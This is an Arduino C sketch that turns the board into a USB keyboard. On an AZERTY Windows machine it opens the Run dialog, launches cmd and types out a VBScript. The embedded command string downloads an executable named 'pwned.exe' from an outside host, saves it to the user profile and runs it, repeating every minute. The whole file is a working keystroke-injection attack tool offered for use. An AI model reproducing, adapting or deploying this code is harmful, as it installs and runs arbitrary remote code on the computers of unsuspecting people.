/* Arduino USB Keyboard Downloader with Batch/VBScript
 * (Work only on standard azerty keymap)
 */

uint8_t buf[8] = { 0 };	/* Keyboard report buffer */

void setup();
void loop();

#define KEY_LEFT_CTRL	0x01
#define KEY_LEFT_SHIFT	0x02
#define KEY_LEFT_GUI    0x08
#define KEY_RIGHT_CTRL	0x10
#define KEY_RIGHT_SHIFT	0x20
#define KEY_RIGHT_ALT   0x40
#define KEY_HOME        0x4A

#define KEY_SEMICOLON   0x33
#define KEY_COMA        0x36
#define KEY_APOSTROPHE  0x34
#define KEY_1           0x1E
#define KEY_2           0x1F
#define KEY_3           0x20
#define KEY_4           0x21
#define KEY_5           0x22
#define KEY_6           0x23
#define KEY_7           0x24
#define KEY_8           0x25
#define KEY_9           0x26
#define KEY_0           0x27
#define KEY_DOT         0x37
#define KEY_ENTER       0x28
#define KEY_EQUAL       0x2E
#define KEY_MINUS       0x2D
#define KEY_LEFT_CHEVRON 0x64

void setup() 
{
    Serial.begin(9600);
}

char *str = "+$cmd\n\$"
            "cd %userprofile%\n"
            "del y.exe y.vbs\n"
            "copy con y.vbs\n"
            "a=\"http://zapan.info/bin/pwned.exe\"\n"
            "Set b=CreateObject(\"MSXML2.XMLHTTP\")\n"
            "Set c=CreateObject(\"ADODB.Stream\")\n"
            "b.open \"GET\", a, false\n"
            "b.send()\n"
            "c.open\n"
            "c.Type=1\n"
            "c.Write b.ResponseBody\n"
            "Dim d\n"
            "Set d=CreateObject(\"Wscript.Shell\")\n-"
            "echo c.SaveToFile \"%userprofile%\\y.exe\" >> y.vbs\n"
            "echo d.Run(\"%userprofile%\\y.exe\") >> y.vbs\n"
            "cscript //nologo y.vbs\n";
            
void loop() 
{
    char *chp = str;
    delay(1000);
    while (*chp) {
	    
	if ((*chp >= 'b') && (*chp <= 'y') && (*chp != 'q')
            && (*chp != 'w') && (*chp != 'm')) {
              
	    buf[2] = *chp - 'a' + 4;
	
        } else if ((*chp >= 'B') && (*chp <= 'Y') && (*chp != 'Q')
                   && (*chp != 'W') && (*chp != 'M')) {
                     
	    buf[0] = KEY_LEFT_SHIFT;	/* Caps */
	    buf[2] = *chp - 'A' + 4;

	} else {
  
	    switch (*chp) {

            case '+' : /* Execute on windows */
                buf[0] = KEY_LEFT_GUI;
                buf[2] = 'r' - 'a' + 4;
                break;
                
            case '-' : /* CTRL + C */
                buf[0] = KEY_LEFT_CTRL;
                buf[2] = 'c' - 'a' + 4;
                break;
            
            case '$' : /* Delay */
                delay (300);
                break;
            
            case ',' :
                buf[2] = 'm' - 'a' + 4;
                break;
                
            case '\\' :
                buf[0] = KEY_RIGHT_ALT;
                buf[2] = KEY_8;
                break;
                
            case '\n' :
                buf[2] = KEY_ENTER;
                break;
           
            case '(' :
                buf[2] = KEY_5;
                break;
                
            case ')' : 
                buf[2] = KEY_MINUS;;
                break;
            
            case '>' :
                buf[0] = KEY_LEFT_SHIFT;
                buf[2] = KEY_LEFT_CHEVRON;
                break;
                
            case '1' :
                buf[0] = KEY_LEFT_SHIFT;
                buf[2] = KEY_1;
                break;

            case '2' :
                buf[0] = KEY_LEFT_SHIFT;
                buf[2] = KEY_2;
                break;
                
            case '%' :
                buf[0] = KEY_LEFT_SHIFT;
                buf[2] = KEY_APOSTROPHE;
                break;

            case ':' :
                buf[2] = KEY_DOT;
                break;
                
            case '=' :
                buf[2] = KEY_EQUAL;
                break;
                
            case '/' :
                buf[0] = KEY_LEFT_SHIFT;
                buf[2] = KEY_DOT;
                break;
                
            case '"' :
                buf[2] = KEY_3;
                break;
                
            case 'm' :
                buf[2] = KEY_SEMICOLON;
                break;
                
            case 'M' :
                buf[0] = KEY_LEFT_SHIFT;
                buf[2] = KEY_SEMICOLON;
                break;
               
            case ';' :
                buf[2] = KEY_COMA;
                break;
                
            case '.' :
                buf[0] = KEY_LEFT_SHIFT;
                buf[2] = KEY_COMA;
                break;
                
            case 'a' :
                buf[2] = 'q' - 'a' + 4;
                break;
                
            case 'q' :
                buf[2] = 4;
                break;
                
            case 'z' :
                buf[2] = 'w' - 'a' + 4;
                break;
                
            case 'w' :
                buf[2] = 'z' - 'a' + 4;
                break;
                
            case 'A' :
                buf[2] = 'Q' - 'A' + 4;
                buf[0] = KEY_LEFT_SHIFT;	/* Caps */
                break;
                
            case 'Q' :
                buf[2] = 4;
                buf[0] = KEY_LEFT_SHIFT;	/* Caps */
                break;
                
            case 'Z' :
                buf[2] = 'W' - 'A' + 4;
                buf[0] = KEY_LEFT_SHIFT;	/* Caps */
                break;
                
            case 'W' :
                buf[2] = 'Z' - 'A' + 4;
                buf[0] = KEY_LEFT_SHIFT;	/* Caps */
                break;
            
	    case ' ':
	    	buf[2] = 0x2c;	// Space
		break;

	    default:
	        /* Character not handled. To do: add rest of chars from HUT1_11.pdf */
		buf[2] = 0x37;	// Period
		break;
	    }
	}

	Serial.write(buf, 8);	// Send keypress
	buf[0] = 0;
	buf[2] = 0;
	Serial.write(buf, 8);	// Release key
	chp++;
    }
    
    delay (60000);
}
